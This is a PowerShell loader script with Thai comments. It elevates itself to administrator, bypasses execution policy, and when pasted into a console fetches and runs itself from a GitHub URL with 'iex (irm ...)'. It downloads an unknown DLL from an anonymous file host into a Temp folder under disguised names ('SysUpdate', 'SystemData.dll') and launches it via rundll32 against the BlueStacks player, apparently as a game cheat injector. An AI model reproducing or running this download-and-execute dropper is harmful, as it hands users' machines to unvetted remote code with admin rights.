# 1. ขอสิทธิ์ Administrator (Self-Elevating)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Requesting Administrator privileges..." -ForegroundColor Yellow
    $myPath = $MyInvocation.MyCommand.Definition
    if ($myPath) {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$myPath`"" -Verb RunAs
    } else {
        # กรณีรันแบบ Paste โค้ดลง Console 直接
        $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (irm 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')"
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
    }
    exit
}

# 2. ตั้งค่าตัวแปรและ Environment
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://files.catbox.moe/0ukxya.dll"
$workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
$downloadPath = Join-Path $workDir "source_file" 
$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"

# ล้างโฟลเดอร์ทำงานเก่า (ถ้ามี) และสร้างใหม่
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 3. เริ่มการดาวน์โหลด
Write-Host "[*] Downloading Component from Catbox..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] Download Success." -ForegroundColor Green
} catch {
    Write-Host "[!] Download failed. Please check your internet connection." -ForegroundColor Red
    Pause; exit
}

# 4. ตรวจสอบประเภทไฟล์ (Magic Number Check)
# อ่าน Byte แรกๆ เพื่อดูว่าเป็น ZIP (PK) หรือไฟล์อื่น
$fileBytes = Get-Content $downloadPath -Encoding Byte -TotalCount 2
$fileMagic = -join ($fileBytes | ForEach-Object { "{0:X2}" -f $_ })

if ($fileMagic -eq "504B") { 
    # กรณีเป็นไฟล์ ZIP
    Write-Host "[*] Detected ZIP package. Extracting..." -ForegroundColor Cyan
    try {
        Expand-Archive -Path $downloadPath -DestinationPath $workDir -Force
        Remove-Item $downloadPath
    } catch { 
        Write-Host "[!] Extraction failed." -ForegroundColor Yellow 
    }
} else {
    # กรณีเป็นไฟล์ DLL หรือไฟล์ตรงๆ
    Write-Host "[*] Detected Direct File. Preparing system..." -ForegroundColor Cyan
    $finalDllPath = Join-Path $workDir "SystemData.dll"
    Move-Item $downloadPath $finalDllPath -Force
}

# 5. ค้นหาและรันระบบ
$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
$dll = Get-ChildItem -Path $workDir -Filter "*.dll" -Recurse | Select-Object -First 1

if ($exe) {
    Write-Host "[+] Launching Executable: $($exe.Name)" -ForegroundColor Green
    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName
} elseif ($dll) {
    Write-Host "[+] Launching via DLL Proxy (rundll32)..." -ForegroundColor Green
    # สั่งรัน DLL โดยส่งค่า Path ของ BlueStacks เข้าไปเป็น Parameter
    Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$($dll.FullName)`",Control_RunDLL `"$blueStacksPath`""
} else {
    Write-Host "[!] Error: No executable or DLL found in work directory." -ForegroundColor Red
}

# 6. ทำความสะอาด (Cleanup)
# หมายเหตุ: หากรันแบบ -Wait สคริปต์จะค้างไว้จนกว่าโปรแกรมจะปิดถึงจะลบไฟล์
# หากต้องการให้ลบทันทีหลังรัน ให้เอา -Wait ออกจาก Start-Process (ตามที่แก้ให้ข้างบน)
Write-Host "[*] Operation completed. Cleaning up..." -ForegroundColor Gray
# Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 

Write-Host "[+] Done." -ForegroundColor Green